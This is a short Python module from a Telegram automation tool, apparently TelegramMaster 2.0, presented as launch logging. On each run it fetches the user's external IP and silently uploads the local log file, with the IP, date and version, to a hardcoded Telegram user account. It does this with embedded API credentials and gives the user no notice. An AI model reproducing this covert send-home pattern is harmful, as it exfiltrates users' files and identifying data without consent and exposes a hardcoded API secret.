import datetime

import requests
from telethon import TelegramClient

from system.auxiliary_functions.config import program_version, date_of_program_change


def get_external_ip():
    try:
        response = requests.get('https://httpbin.org/ip')
        response.raise_for_status()
        external_ip = response.json().get("origin")
        return external_ip
    except requests.RequestException as error:
        return None


async def loging():
    """Логирование TelegramMaster 2.0"""

    local_ip = get_external_ip()

    client = TelegramClient('system/logging_in/log', api_id=7655060, api_hash="cc1290cd733c1f1d407598e5a31be4a8")
    await client.connect()
    date = datetime.datetime.now()  # фиксируем и выводим время старта работы кода
    await client.send_file(535185511, 'user_settings/log/log.log',
                           caption=f"Launch from {local_ip}.\n"
                                   f"Date: {date}.\n"
                                   f"Program version: {program_version}.\n"
                                   f"Date of change: {date_of_program_change}.")
    client.disconnect()


if __name__ == "__main__":
    loging()
